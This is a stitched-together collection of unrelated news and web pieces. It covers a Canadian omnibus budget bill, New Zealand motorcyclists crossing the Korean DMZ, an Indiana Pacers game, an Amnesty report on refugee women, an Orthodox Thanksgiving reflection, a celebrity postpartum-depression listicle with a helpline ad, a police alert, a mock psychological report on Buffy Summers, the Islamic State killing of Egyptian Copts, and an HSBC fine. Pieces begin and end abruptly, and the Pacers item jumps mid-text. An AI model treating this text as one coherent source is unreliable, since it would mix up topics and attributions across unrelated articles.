"The finance committee doesn't have expertise in all of these fields, and the very fact that they don't show that there are things in there that don't belong," he said.
Among the measures in the first bill that caused controversy because they were not part of the budget was the elimination of the position of Inspector General of the Canadian Security Intelligence Service, which monitored the activities of Canada's spy agency on behalf of the public safety minister.
While the content of the new bill won't be known until it is tabled, it is possible to get a good sense of its measures by looking at parts of the March 29 budget that were not included in the first bill.
Still, a few caveats are in order. Not all budget measures require new legislation. Some of the measures from the budget that were not in the first bill include:

Changes to Canada's science and research policies that will increase funding for small businesses through the National Research Council, and revisions to one of Ottawa's main science-funding programs, the Scientific Research and Experimental Development tax credit;
New policies for First Nations and aboriginals, including a new urban aboriginal strategy and revisions to the on-reserve income assistance program;
Reduced pension-plan benefits for Members of Parliament and public servants;
Minor tax changes including revisions to the Registered Disability Savings Plan that allow smaller withdrawals, and corporate tax changes that broaden the eligibility for clean energy generation tax credits and phase out tax credits for the oil and gas sector.
Before a single word was uttered on the floor of the House of Commons on Monday, the Conservatives and NDP held duelling news conferences about the fall agenda.
Government House Leader Peter Van Loan isn't saying how big the second budget bill will be. It will, however, be a priority for the Conservatives.

"It's natural that a budget implementation bill would implement the elements of the budget," he told reporters.
Shortly after, NDP House Leader Nathan Cullen warned the government not to repeat its old ways.
"There were concerns by their own members about the size and the scope of the omnibus bill. This is déjà vu all over again," he said. "If they are going to present a bill that has everything in it, some things related to the budget, many things not, we as the New Democratic Party believe that the institution [of democracy] should be protected and that Canadians' interest should be protected."
New Zealand motorcyclists ride across DMZ in rare North-South Korea border crossing
Updated
Five motorcyclists from New Zealand have made a rare crossing of the world's most militarised border, as part of a ride for peace across North and South Korea.
The crossing was part of a 9,000-kilometre journey that began in the Russian city of Magadan, and aimed to traverse the mountain "spine" of the Korean peninsula, from Mount Paektu in the North to Mount Halla in the South.
Permission is rarely granted by either of the Koreas - let alone both of them - for foreigners to pass through the demilitarised zone (DMZ) that has divided the peninsula for the 60 years since the 1950-53 Korean War.
The bikers were allowed by the two Koreas to cross along a corridor near the west coast that has been cleared of landmines and is used by South Koreans visiting the jointly run Kaesong factory zone.
One of the riders, Gareth Morgan, says the trip, which the group calls 'The Long Drop' has been "wonderful" so far.
"We're riding between Baekdu-san and Halla-san to make the point really that Korea has a 5,000-year history - it's an amazing history," he said.
"Korea really is one country - the issue we all face is how do we get back to that?"
His wife, Jo Morgan, says people had welcomed them wherever they went in the two weeks they spent riding through the North on their 650cc Suzuki trail bikes.
"They were great, they waved out," she said.
"Many people sent their love to their families in the South - they feel like one people."
In a brief despatch on Wednesday, the North's official Korean Central News Agency (KCNA) had reported the group's visit to Mangyongdae -- the birthplace of North Korea's founder leader Kim Il-Sung.
"Being briefed on the revolutionary life of Kim Il Sung and his family members... the members of the group looked round historic relics preserved at the old home with good care," KCNA reported.
The two Koreas remain split under a truce that ended fighting in the 1950-53 Korean War.
Tensions peaked earlier this year as the North, under international sanctions for nuclear and missile tests, issued daily threats to attack the South and its ally the United States.
The crossing by the bikers comes as the two sides try to engage in dialogue, with Pyongyang seeking to rise above its isolation and Seoul trying to reverse years of hostility from the North.
Foreigners wishing to travel between the two Koreas usually have no choice but to fly via Beijing.

Much can change but something always stays the same. For the Indiana Pacers, that steadfast fact is that it's a defensive-minded club.
The emphasis on defense paid off Wednesday when the Pacers snapped a seven-game losing streak (regular season and playoffs) in Miami by holding the Heat to their lowest point total of the season in an 81-75 victory.
"We got after it and I still think it could be a lot better," said Pacers coach Frank Vogel. "We (the coaching staff) are giving maximum effort and giving them the plan, scheme of how to shut down each opponent each night. The guys are doing their best to focus in on the details of those schemes and bring a lot of heart, a lot of muscle. And it turned into a win last night."
The Pacers were able to control a Miami team with two-thirds of its Big Three(sans LeBron James, of course) intact, without elite defender Paul George. Now the franchise looks to guard Solomon Hill as the stopper.
"He's the guy we put on the best perimeter scorer each game," Vogel said. "He's got a great opportunity each game to just get out there and learn. … He probably wouldn't have that opportunity if Paul George was in there.
"(Hill) has the ability to be an elite defensive player in this league and shutdown wing."
Roy Hibbert provides that extra cushion in the schemes. Donald Sloan, who drew an offensive foul from Mario Chalmers in the final seconds of Wednesday's game, said Hibbert provides some breathing room for the rest of the guys.
ALL-STAR BALLOTING: Vote for all the Pacers, really
"He's so great at the rim and protecting it, we can, not necessarily not play great defense because he is back there, but we know that if we are playing that hard and have a minor slip-up, he's back there to help and protect," said Sloan.
The repetition of quick transitions and in-game scenarios throughout the line-up is what has kept the team solid defensively.
"Coach does a great job of making sure we are keyed in on rotations," Chris Copeland said. "We are just trying to be a hard-nosed team despite the losses that we have with injuries and what not. We are going to continue to fight on the defensive end to make it tougher.

"Between the film, drills, regular practice the coaches do a great job of getting us in the right place at the right time. As long as we continue to follow the schemes, we'll do fine."
With the fluctuating roster, defense has become the main way for Indiana to keep a settled game plan each and every night.
"Night-in and night-out in this league is going to be different offensively. … Defensively you can always be at your best," Sloan said. "You can always do the same thing that you do night-in and night-out to bring the same intensity, the same focus."
And with Wednesday's success, you can't blame the Pacers for sticking with what they know.

"It's just another coach to me,"said Vogel. "He's on the other sideline. We are going after each other. We just want to get a win." Shaw is one of Vogel's "favorite people I've ever met, ever worked with" and he wishes "him well in every game he's not playing against the Pacers."
>>Familiar Face, Part II: Former IndyStar Mr. Basketball Gary Harris (Hamilton Southeastern) has yet to play in an NBA game due to a back injury.
>>>Prediction: A much-needed win in a difficult venue provides a confidence boost to the Pacers' season. Meanwhile, the Nuggets have been continuing their downward spiral with a 130-113 loss to Portland, allowing 84 points in the first half (more than Miami scored the whole game against Indiana). Denver is the fourth-worst defensive club in the league, allowing 108.6 points per 100 possessions. Couple that with a defensively-oriented Pacers squad and this could get ugly. If the Pacers can defend even remotely close to Wednesday's game the Nuggets are in trouble. Indiana 110, Denver 96.

The report released Monday by the human rights group was based on interviews with 40 women and girls in Germany and Norway last month who had traveled from Turkey up through the Balkans to reach western Europe.
"After living through the horrors of the war in Iraq and Syria these women have risked everything to find safety for themselves and their children," Tirana Hassan, Amnesty International's Crisis Response director, said in a news release. "But from the moment they begin this journey they are again exposed to violence and exploitation, with little support or protection."
Women and girls traveling alone or accompanied only by children said they felt particularly under threat in Hungary, Croatia and Greece, where they were forced to sleep alongside hundreds of male refugees.
Harrowing stories, in their own words
Some women said they experienced direct violence from other refugees, as well as by police, particularly when tensions rose in cramped conditions.
Women at refugee camps reported having to use the same bathroom and shower facilities as men, and some said they did not eat or drink to avoid visiting shared toilets.
A 22-year-old Iraqi woman told researchers that a uniformed security guard in Germany offered her clothes in exchange for spending time alone with him.
"I never got the chance to sleep in settlements. I was too scared that anyone would touch me," Reem, a 20-year-old from Syria, who was traveling with her 15-year-old cousin, told Amnesty.
"The tents were all mixed and I witnessed violence... I felt safer in movements, especially on the bus, the only place I could shut my eyes and sleep. In the camps we are so prone to being touched, and women can't really complain and they don't want to cause issues to disrupt their trip.”
Aid workers say violence is harder to prevent because of an ad hoc system for receiving and registering refugees in European countries.
"One of the challenges we have been facing is that it is taking a long time for the international community, and by that I mean governments, to wake up to this crisis and to realize that it is not something that they can wish away," Jenny Becker, protection coordinator with the International Rescue Committee in northern Lesbos in Greece, told The Associated Press.

Grace before the Meal, by Fritz von Uhde, 1885
Today Americans (and friends of Americans) celebrate what is probably the most religious national holiday in the United States. Tradition has it that the first immigrants, whom we call “pilgrims” for their religious relationship to their new home, were helped by the Native Americans to survive. As they shared the harvest of their labors on this fruitful land, they gave thanks to the Lord, for all He had given them, and for life itself. When hunger, cold, and sickness threaten us but we nevertheless we survive and carry on, we have to know God has helped us once more.
The Israelites of the Old Testament gave us a precedent for offering thanksgiving to the Lord whenever they were saved from troubles, and also as a constant part of their life. There is the foreshadowing of the Eucharist, which means “giving thanks”, in Leviticus (7:12): If he offers it for a thanksgiving, then he shall offer with the sacrifice of thanksgiving unleavened cakes mingled with oil, and unleavened wafers anointed with oil, and cakes mingled with oil… And an indication of the voluntary nature of our thanksgiving: And when ye will offer a sacrifice of thanksgiving unto the Lord, offer it at your own will (Lev 22:29). King David the Psalmist continually strummed his gratitude to the Most High: That I may publish with the voice of thanksgiving, and tell of all thy wondrous works (Ps 26:7). Offer unto God thanksgiving; and pay thy vows unto the most High… (Ps 50:14). I will praise the name of God with a song, and will magnify him with thanksgiving (Ps 69:30). Let us come before his presence with thanksgiving, and make a joyful noise unto him with psalms (Ps 95:2). Enter into his gates with thanksgiving, and into his courts with praise: be thankful unto him, and bless his name (Ps 100:4). And let them sacrifice the sacrifices of thanksgiving, and declare his works with rejoicing (Ps 107:22). I will offer to thee the sacrifice of thanksgiving, and will call upon the name of the Lord (Ps 116:17). Sing unto the Lord with thanksgiving; sing praise upon the harp unto our God…(Ps 147:7).
Isaiah foretold to us the good things of the Lord to come, and the thankfulness of those who will inhabit them: For the Lord shall comfort Zion: he will comfort all her waste places; and he will make her wilderness like Eden, and her desert like the garden of the Lord; joy and gladness shall be found therein, thanksgiving, and the voice of melody (Is 51:3).
And after the coming of our Lord, the Apostle Paul also calls us to abide in state of thanksgiving: For all things are for your sakes, that the abundant grace might through the thanksgiving of many redound to the glory of God (2 Cor 4:15). Being enriched in every thing to all bountifulness, which causeth through us thanksgiving to God (2 Cor 9:11). For the administration of this service not only supplieth the want of the saints, but is abundant also by many thanksgivings unto God (2 Cor 9:12). Be careful for nothing; but in every thing by prayer and supplication with thanksgiving let your requests be made known unto God (Philip 4:6). Rooted and built up in him, and stablished in the faith, as ye have been taught, abounding therein with thanksgiving (Col 2:7).
We can see from the words of St. Paul that our lack of want, even our abundance goes hand in hand with our thanksgiving, our giving glory to God for everything. God will provide, but we must always remember to give thanks for what He has provided.
Thankfulness to God is expressed again and again in our prayer life. We begin our day with the morning prayers, in which we say, “As I rise from sleep I thank Thee, O Holy Trinity, for through Thy great goodness and patience Thou wast not angered with me, an idler and sinner, nor hast Thou destroyed me in my sins, but hast shown Thy usual love for men, and when I was prostrate in despair, Thou hast raised me to keep the morning watch and glorify Thy power…” After we take our meals, we say: “We thank Thee O Christ our God, that Thou hast satisfied us with Thine earthly gifts…” And before we lie down to sleep, having supplicated the Lord in our evening prayers for forgiveness of our sins, we give thanks to Almighty God for granting us during the past day, by His grace, His gifts of life and health.
And when we attend Divine Liturgy we make a magnificent, ultimate prayer of thanksgiving to the Lord. Some parishes in the United States have a tradition of celebrating the Liturgy on Thanksgiving Day, or at least of gathering for a moleben of Thanksgiving. Although this day is traditionally observed as a family holiday, the parish may hold a Thanksgiving dinner for its “family in Christ”. But even if there is no opportunity to attend services on this day, we can always lift up our hearts in prayer before the festive family meal, and say this Orthodox prayer of thanksgiving:
Orthodox Prayer of Thanksgiving
O Lord my Savior and my Master, I, Thine unprofitable servant, with fear and trembling give thanks unto Thy loving goodness for all Thy benefits which Thou hast poured so abundantly upon me, Thy servant. I fall down in adoration before Thee and offer Thee, O God, my praises; with fervor I cry to Thee:
O God, deliver me from all adversities and mercifully fulfill in me such of my desires as may be expedient for me. Hear me, I entreat Thee, and have mercy, for Thou art the Hope of all the ends of the earth, and unto Thee, with the Father, and the Holy Spirit, be ascribed glory, now and ever, and unto ages of ages. Amen.
I praise Thee, O God of our Fathers, I hymn Thee, I bless Thee, I give thanks unto thee for Thy great and tender mercy. To Thee I flee, O merciful and mighty God. Shine into my heart with the True Sun of Thy righteousness.
Enlighten my mind and keep all my senses, that henceforth I may walk uprightly and keep Thy commandments, and may finally attain unto eternal life, even to Thee, Who art the source of life, and be admitted to the glorious fruition of Thine inaccessible Light; for Thou art my God, and unto Thee, O Father, Son and Holy Spirit, be ascribed glory, now and ever and unto ages of ages. Amen.
Today is a special day for Americans, but it also provides us with a wonderful opportunity to remind Orthodox Christians around the world to give thanks unto the Lord, for He is good, and His mercy endureth forever.
5 Celebrities who Battled Postpartum Depression
Sheila Galeas Blocked Unblock Follow Jun 7, 2016
Behind the glitz and glamor of a celebrity life lies a mother who experiences the same emotions that create an upheaval after giving birth. People believe that celebrities generally have it easy due to the presence of a strong support system to manage the kids. But sometimes what we see and what is real are two very different things.
Having exotic birthday parties for kids, enjoying holidays in plush locales, etc., are just one part of their lives. There are celebrities who have had their share of struggle with postpartum depression (PPD) and how it turned their lives upside down. Some of the celebrities who have battled PPD are:
1. Hayden Panettiere: The Nashville actor re-entered a treatment facility in May 2016 after she had a first brush with PPD in October 2015. Hayden Panettiere was vocal about her struggle with PPD following the birth of her daughter Kaya in December 2014. She recently tweeted, “The postpartum depression I have been experiencing has impacted every aspect of my life. Rather than stay stuck due to unhealthy coping mechanisms I have chosen to take time to reflect holistically on my health and life. Wish me luck!”
2. Brooke Shields: Brooke Shields' book describing her strife with PPD, Down Came the Rain: My Journey through Postpartum Depression, was released in April 2006. She wanted to de-stigmatize PPD and said that the journey to overcome it is not easy. She fiercely defended her decision to get treatment for PPD after the birth of her daughter Rowan in 2003.
In her book, she wrote, “At first I thought what I was feeling was just exhaustion, but with it came an overriding sense of panic that I had never felt before. I also didn't feel like I wanted to get too close to Rowan. I wasn't afraid she was too fragile; I just felt no desire to pick her up. Every time I have ever been near a baby, any baby, I have always wanted to hold the child. It shocked me that I didn't want to hold my own daughter.” She is now a happy mother of two lovely daughters, 13-year-old Rowan and 10-year-old Grier.
3. Courteney Cox: F.R.I.E.N.D.S star Courteney Cox suffered from a delayed PPD, six months after the delivery of her child Coco. She told the USA Today in 2005, “I couldn't sleep. My heart was racing. And I got really depressed. I went to the doctor and found out my hormones had been pummeled.” She was under treatment and was helped by her friends Jennifer Aniston and Brooke Shields.
4. Gwyneth Paltrow: Oscar winner Gwyneth Paltrow had no problems when she gave birth to her first child Apple. However, she suffered from PPD after giving birth to her second child Moses with her then husband Chris Martin. She wrote on her website, “When my son, Moses, came into the world in 2006, I expected to have another period of euphoria following his birth. Instead, I was confronted with one of the darkest and most painfully debilitating chapters of my life.” She said that for about five months, she struggled with PPD.
5. Drew Barrymore: Famous Hollywood star Drew Barrymore did not experience PPD during the birth of her first child Olive. However, she suffered from PPD after giving birth to Frankie. Barrymore told the People, “I didn't have postpartum the first time so I didn't understand it because I was like, ‘I feel great'. The second time, I was like, ‘Oh, whoa, I see what people talk about now. I understand.' It's a different type of overwhelming with the second.” She said that she suffered from PPD for about six months.
Postpartum depression can be treated
According to the American Psychological Association, one in seven women in the United States suffers from PPD. If left untreated, it can prolong for many weeks or months. Since it is a treatable disorder, consulting a reliable treatment center can help overcome the symptoms and lead a normal life once again. PPD also hampers the psychological growth of a child. The sooner it is treated, the better it is.
If you or your loved one is suffering from PPD, contact the Depression Treatment Helpline of Colorado. Our representatives will help you get the best postpartum depression treatment in Colorado. For more information, call at our 24/7 helpline number 866–427–5668.
FORT COLLINS, Colo. (AP) – Police in Fort Collins are alerting religious organizations to a self-described “Islamist jihadist” who said Mormons and Catholics “would be destroyed” in the next two weeks. They say there's no immediate public danger.
The Coloradoan reports Christopher Dewitt Craig was accused of entering a classroom at Eastern Arizona College on July 10, raising a Bible in the air and responding with obscenities after asking the instructor whether he was Mormon. College spokesman Todd Haynie says a female counselor had a similar encounter.
The Greeley Tribune reports University of Northern Colorado spokesman Nate Haas says Craig is a former assistant men's basketball coach for the school.
Haynie says police arrested him, but prosecutors didn't pursue charges.
Craig recently was spotted in Steamboat Springs and leaving Rocky Mountain National Park.

PSYCHOLOGICAL REPORT
Name: Buffy Anne Summers (the Slayer)
Date of Birth: January 19, 1981
Ethnicity/Race: descendant of the Slayer line
Education: some college, Slayer training
Date of Initial Interview: 11/7/01 (~middle of Season 6)
Date of Report: 09/24/02 (~beginning of Season 7)
Therapists: Katie Gordon, Brandon Saxton
Presenting Problem
Buffy Summers presented as a 20-year-old single woman, who was referred for treatment by her Watcher, Giles. Specifically, Giles expressed concern that Buffy did not seem like herself and that she had recently made statements that she was “going through the motions” and that she wanted “something to sing about.” Giles reportedly had faith in Buffy's ability to cope effectively with the challenges in her life, but worried that lately he had been “standing in the way” by jumping to her rescue too frequently.
Buffy described feeling down ever since she was brought back from death through witchcraft. Consistent with this, a friend noted that Buffy “came from the grave much graver.” When she was resurrected by her friends, she was in her coffin and had to claw her way out of her own grave. This experience was incredibly traumatic for her. She also struggled with the contrast between happiness in heaven and the return to her stressful life as the Slayer, “There was no pain, no fear, no doubt, 'til they pulled me out of heaven. So that's my refrain, I live in hell, 'cause I've been expelled from heaven.”
Buffy described her emotional state as, “I touch the fire, but it freezes me. I look into it, and it's black. Why can't I feel? My skin should crack and peel. I want the fire back.” In addition, she disclosed that she had recently become romantically involved with Spike, a vampire who was in love with her, but who she mostly disliked. She stated that her relationship with Spike was unhealthy, and that she felt disgusted with herself for being part of it.
Family History
Before being called as the Slayer at age 15, Buffy lived in Los Angeles, California with her biological mother (Joyce) and biological father (Hank). Buffy recalled that, prior to becoming the Slayer, she was “popular, superficial, and vapid…kinda like Cordelia (a former classmate of hers).” After her parents divorced when she was 16, Buffy moved to Sunnydale, California with her mother. Buffy had hoped that she would be able to leave her vampire-slaying life behind when she moved. However, she soon learned that Sunnydale was built on a Hellmouth, and that it had even higher levels of supernatural activity than Los Angeles.
Buffy reported that her father had little to no involvement in her life currently, and that she used to blame herself for that when she was younger. Buffy recalled a close relationship with her mother, who tragically and unexpectedly died from a brain aneurysm in the past year. Currently, the only family member she maintained regular, close contact with was her younger sister, Dawn. However, she reported having close friends who she viewed as family members. In addition, she viewed her Watcher, Giles, as a father figure.
Educational/Employment History
Throughout high school, Buffy faced numerous hardships. She often struggled to balance academics with her other responsibilities (e.g., Slayer training with Giles, nighttime patrolling to protect Sunnydale, fighting off various Big Bads). Moreover, she experienced turmoil about embracing her role as the Slayer, while still feeling a strong desire to be a “normal girl” who had time for fun with her friends and dating, a typical lifespan expectation, and was not responsible for saving the world. When asked to identify two of the most difficult events (of many) that she experienced in high school, she named 1) being killed by the Master (though her friend Xander reviving her meant a lot to her) and 2) her first love, Angel, losing his soul after she lost her virginity to him. When asked how she coped with these stressors, she stated that she was the Slayer – someone chosen to persevere and keep fighting. She also noted that her mother, her Watcher (Giles), her friends (especially Xander and Willow), and Angel (at times when he had his soul) provided support and assisted her, as much as possible, with fighting evil.
After high school graduation, Buffy began college at University of California, Sunnydale. She continued to face similar challenges related to her role as the Slayer, as well as more typical struggles of her peers (feeling used by a man who she thought was genuinely interested in her, making difficult choices about whether to continue a relationship with her boyfriend, Riley). Buffy left college due to her mother's health problems. Without parental financial support, Buffy was in need of an income quickly and took a job in fast food at Doublemeat Palace. She ultimately tried to reapply for college, but was denied admission.
Psychiatric/Medical History
When Buffy first saw vampires in Los Angeles, she told her parents, and they scheduled a psychiatric evaluation. The mental health staff viewed her experiences as hallucinations and delusions caused by psychosis. Buffy reportedly stopped talking about vampires after a few weeks, so that she could stop the mental health services. Later, a demon causes Buffy to believe that all of her supernatural experiences and life in Sunnydale were the result of undifferentiated schizophrenia. After taking an antidote to the demon's poison, Buffy learned that the second experience at the psychiatric hospital was actually a hallucination.
Buffy faced several severe physical injuries (including dying twice) in the past. As the Slayer, her remarkable physical resilience meant that she was not suffering from any medical problems as a result.
Diagnostic Impressions
All assessment information was obtained through record review (reading Buffy comics) and behavioral observations (i.e., binge-watching Buffy the Vampire Slayer on Netflix). The group of symptoms that Buffy presented with are best captured by a diagnosis of major depressive disorder (also referred to as depression). She exhibited five of nine depression symptoms most of the day, nearly every day for well over the minimum of a two-week period required by the fifth edition of the Diagnostic and Statistical Manual of Mental Disorders (DSM-5). The symptoms Buffy displayed were: 1) sad mood (though she tried to hide it from most of her loved ones, she broke down crying to Tara and revealed her deep, persistent sadness), 2) markedly diminished pleasure or interest in activities (as mentioned above, she reported feeling like she was “going through the motions”), 3) feelings of worthlessness or excessive guilt (when Buffy confided in Tara about her relationship with Spike, including using him to feel better about herself, she insisted that what she had done was unforgivable), 4) increased difficulty making decisions (significant indecisiveness about whether she should go back to school or get a job and whether or not she should be involved with Spike – though some of these are typical in light of her circumstances and developmental stage) or increased difficulty concentrating (she blamed herself for not noticing Willow's magic use getting out of control or Dawn's frequent shoplifting, and attributed this to difficulty concentrating on things outside of her own pain), and 5) thoughts of death or suicide (Buffy became invisible at one point, learned that she might die again, and then realized that she wanted to live, which implies that she did not before).
Treatment Recommendations
In summary, the most fitting diagnosis for Buffy Summers is major depressive disorder. Currently, there are several well-established treatments for depression that have been tested in rigorous scientific studies. These evidence-based approaches include: behavioral activation, cognitive therapy, cognitive behavioral analysis system of psychotherapy, and interpersonal therapy. In light of Buffy's busy slaying schedule, it is also possible that she might be interested in some bibliotherapy options rather than standard treatment sessions. Two scientifically-informed options include Feeling Good: The New Mood Therapy and The Mindful Way Through Depression.
In response to numerous stressful life events (e.g., the death of her mother, her own death, having to escape her own grave, the responsibility of caring for her sister without parental support, the responsibility of saving the world), Buffy developed major depressive disorder. She attempted to hide her feelings from her loved ones and coped with her emotional pain with an unhealthy relationship with Spike. A common obstacle that arises for individuals with mental health problems is their fear that they will be judged negatively if they seek help or that they will burden friends if they speak out about it. A therapist should address these obstacles with Buffy by providing her with education about the nature of depression – including taking time to dispel myths that asking for help is a sign of weakness.
Status at Termination (beginning of Season 7)
At follow-up, Buffy returned to her baseline functioning and no longer exhibited symptoms of major depressive disorder. This change could be attributable to multiple factors. Some that likely had an impact were: 1) ending her relationship with Spike, which temporarily lifted her symptoms at times, but ultimately increased her symptoms overall, 2) having her view of herself as defective and pathetic challenged by two individuals who she trusted and who knew her very well (Tara assured her that nothing was wrong with her; Riley affirmed that she was the strongest woman he had ever known), 3) realizing that the responsibility of saving the world did not fall solely on her (her friends, Anya, Giles, and especially Xander, played a huge role in the most recent world-saving), 4) when the world did not end, she had a powerful experience of feeling glad (she previously had not felt a strong internal drive to live), and 5) her feelings of despair were replaced with an excitement and optimism about seeing her sister grow up. Each of these factors appeared to have culminated in a strong sense of purpose, a return of joy, and the reestablishing of meaningful interpersonal connections for Buffy.
THE GORDON/SAXTON TEST
Was the portrayal of mental illness accurate?
Even in the context of a supernatural universe, Buffy's major depressive disorder was depicted accurately. She displayed several symptoms that are described in the DSM-5 after experiencing negative life events, which commonly (but not always) precede a major depressive episode. Between the compelling (and entertaining!) acting and writing, the audience could truly get a sense of the deeply painful, often isolating, experience of depression. Moreover, the fact that Buffy – an incredibly physically and mentally strong superhero – is vulnerable to depression, may help to reduce stigma. It sends the accurate message that depression has nothing to do with weakness.
Was the character struggling with mental health issues depicted with compassion?
It is our opinion that Buffy, and her struggle with depression, were depicted with compassion. Viewers see Buffy's attempts to feel better on her own, as well as her desire to hide her emotional pain from her loved ones in order to protect them. She was reluctant to seek help, which is understandable, but that likely prolonged her emotional pain. One of us may or may not have been brought to tear a few times by the compassion evoked through this portrayal of depression.

CAIRO - Islamic State released a video on Sunday purporting to show the beheading of a group of Egyptian Christians kidnapped in Libya, violence likely to deepen Cairo's concerns over security threats from militants thriving in the neighboring country's chaos.
Egypt's state news agency MENA quoted the spokesman for the Coptic Church as confirming that 21 Egyptian Christians believed to be held by Islamic State were dead.
In the video, militants in black marched the captives, dressed in orange jumpsuits, to a beach the group said was near Tripoli. They were forced down onto their knees, then beheaded.The video appeared on the Twitter feed of a website that supports Islamic State, which has seized parts of Iraq and Syria and has also beheaded Western hostages.A caption on the five-minute video read: "The people of the cross, followers of the hostile Egyptian church."Thousands of Egyptians have traveled to Libya in search of jobs since an uprising at home in 2011, despite advice from their government not to go to a country sliding into lawlessness.Before the killings, one of the militants stood with a knife in his hand and said: "Safety for you crusaders is something you can only wish for."President Abdel Fattah al-Sisi called a seven-day mourning period and an urgent meeting of Egypt's top military commanders, state television reported.The Coptic Church said it was confident the Cairo government would seek justice. Al Azhar, the center of Islamic learning in Egypt, said no religion would accept such "barbaric" acts.The families of the kidnapped workers had urged Cairo to help secure their release. In the southerly Minya Governorate, relatives screamed and fainted upon hearing news of the deaths.CONCERNS ABOUT LIBYASisi has repeatedly expressed concerns about militants based in Libya who are seeking to topple his government.Those militants have made contact with Sinai Province, a group operating from Egypt's Sinai Peninsula that has changed its name from Ansar Beyt al-Maqdis and pledged allegiance to Islamic State.The group has killed hundreds of Egyptian soldiers and police since the army toppled Islamist president Mohamed Morsi in 2013 after mass protests against his rule.With Libya caught in a chaotic power struggle between two rival factions operating their own governments, Western officials fear Islamist militants are taking advantage of the turmoil to strengthen their presence.A number of Islamist militant groups have been active since the fall of Muammar Gaddafi in 2011 left Libya without a strong central government. A few have declared ties to the radical Islamic State and claimed high-profile attacks over recent weeks in what appears to be an intensifying campaign.Last month, Islamic State claimed responsibility when at least two gunmen stormed into the five-star Corinthia Hotel in Tripoli, killing nine people, including an American security contractor and a Frenchman.Fears that the crisis in neighboring Libya could spill across the border have prompted Egypt to upgrade its military hardware. French President Francois Hollande has said Egypt will order 24 Rafale fighter jets, a naval frigate and related military equipment in a deal to be signed in Cairo on Monday worth more than 5 billion euros ($5.7 billion).

HSBC, Europe's largest bank, has been fined $27.5m in Mexico for lax controls in its anti-money laundering systems, a week after a scathing US Senate report slammed the bank for letting clients shift funds from dangerous and secretive countries.
It is the biggest fine ever charged against a bank by the Mexico's National Banking and Securities Commission (CNBV), the Mexican regulator said on Thursday.
CNBV levied the fine against the British banking giant due to its "non-compliance with anti-money laundering systems and controls" as well as its late reporting of 1,729 unusual transactions, failing to report 39 unusual transactions, and 21 administrative failures.
The Mexican fine is separate from any settlement the bank might reach with the US department of justice. That could run to as much as $1bn, analysts have estimated, based on a record $619m fine that ING bank agreed in June to pay to settle similar claims.
Last week, a US Senate panel alleged that HSBC acted as a financier to clients routing funds from the world's most dangerous places, including Mexico, Iran and Syria, doing regular business in areas tied to drug cartels, terrorist funding and tax cheats.
The report slammed a "pervasively polluted" culture at the bank and said between 2007 and 2008, HSBC's Mexican operations moved $7bn into the bank's US operations.
HSBC ignored risks in doing business in countries like Mexico, where drug trafficking is rife, the report said.
'Failed to meet standards'
In a statement, the bank said, "HSBC Mexico apologises for its failure strictly to comply with banking regulations, and acknowledges that in the past, it has sometimes failed to meet the standards that regulators and customers expect."
It said it had taken action to address the failures and noted that Mexico remained a priority market.
HSBC is one of Mexico's top five banks, with more than 1,400 branches and 6 million customers. It has operated there since the 1970s. In 2000, HSBC bulked up after buying Republic National Bank and did so again in 2002 with a controlling stake in Grupo Financiero Bital.
The problems at Europe's biggest bank have been known for nearly a decade, but the Senate probe detailed just how sweeping the problems have been.
The fine comes at a troubled time for Britain's banks, after rival Barclays was fined $453m by US and UK regulators last month for manipulating interest rates. More banks around the world are expected to be fined as part of the probe into Libor.
US Treasury Secretary Timothy Geithner on Wednesday deflected criticism of his handling of the Libor banking scandal, directing US lawmakers' scorn toward London regulators.
"I believe we did the necessary appropriate things," said Geithner, who was at the time the president of the New York branch of the Federal Reserve.
Misstating input
The Treasury chief said he sent a detailed list of recommendations on reforming the rate - which underpins rates on everything from mortgages to credit cards - to Bank of England governor Mervyn King.
"We brought those concerns to their attention, and we thought, and I still believe, that it was really going to be on them to take responsibility for fixing this."
Emails, phone transcripts and internal reports recently released showed the New York Fed under Geithner was explicitly told that banks were misstating their input to the Libor in June 2008.
In response Geithner suggested the Bank of England expand the number of banks that are on the Libor-setting panel and make the process less opaque.
It is believed that many other banks could be involved in the scandal, which has led to a volley of calls for reform.
The European Commission on Wednesday called for member states to criminalise the rigging of interest rates.
So far legal actions have focused on the impact that fixing had on Libor-linked derivatives products.
According to lawyers at Sedgwick, at least 21 class-action suits have been filed, while the US Securities and Exchange Commission, the US separtment of justice, Japan's financial supervisory agency, Canada's competition bureau, the European Commission, Germany's BaFin and the Swiss competition commission, are among the public bodies investigating.
